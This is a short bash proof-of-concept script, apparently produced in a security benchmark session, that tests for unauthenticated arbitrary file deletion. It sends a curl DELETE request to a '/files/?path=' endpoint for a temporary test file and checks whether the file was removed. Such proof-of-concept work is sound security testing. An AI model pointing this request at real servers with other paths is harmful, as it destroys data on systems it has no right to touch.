#!/bin/bash
# POC: Demonstrates arbitrary unauthenticated file deletion via DELETE /files/?path=FILEPATH endpoint
# Target: ./repo
# Created: 2025-11-07T22:05:49.008Z
# Session: benchmark-XBEN-083-24-mhpe40z0

# Arbitrary File Deletion Vulnerability POC
# Target: DELETE /files/?path=FILEPATH
# This POC demonstrates unauthenticated file deletion via HTTP DELETE request

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-2280}"
TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

echo -e "${YELLOW}[*] Arbitrary File Deletion Vulnerability POC${NC}"
echo -e "${YELLOW}[*] Target: ${TARGET_URL}${NC}"
echo

# Step 1: Create a test file to delete
TEST_FILE="/tmp/testfile_deletion_poc_$RANDOM.txt"
echo -e "${YELLOW}[*] Creating test file: ${TEST_FILE}${NC}"
echo "test file content for deletion" > "$TEST_FILE"

# Verify file was created
if [ ! -f "$TEST_FILE" ]; then
    echo -e "${RED}[!] Failed to create test file${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Test file created successfully${NC}"
ls -lah "$TEST_FILE"
echo

# Step 2: Attempt to delete the file via HTTP DELETE request
echo -e "${YELLOW}[*] Attempting to delete file via HTTP DELETE request...${NC}"
echo -e "${YELLOW}[*] DELETE ${TARGET_URL}/files/?path=${TEST_FILE}${NC}"
echo

RESPONSE=$(curl -s -w "\n%{http_code}" -X DELETE "${TARGET_URL}/files/?path=${TEST_FILE}")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
RESPONSE_BODY=$(echo "$RESPONSE" | head -n-1)

echo -e "${YELLOW}[*] HTTP Response Code: ${HTTP_CODE}${NC}"
echo -e "${YELLOW}[*] Response Body:${NC}"
echo "$RESPONSE_BODY"
echo

# Step 3: Verify file deletion
echo -e "${YELLOW}[*] Verifying file deletion...${NC}"
if [ ! -f "$TEST_FILE" ]; then
    echo -e "${GREEN}[+] SUCCESS! File was deleted via unauthenticated HTTP DELETE request${NC}"
    echo -e "${GREEN}[+] Vulnerability confirmed: Arbitrary file deletion is possible${NC}"
    exit 0
else
    echo -e "${RED}[!] File still exists after DELETE request${NC}"
    echo -e "${RED}[!] Deletion may have failed or endpoint doesn't exist${NC}"
    ls -lah "$TEST_FILE"
    exit 1
fi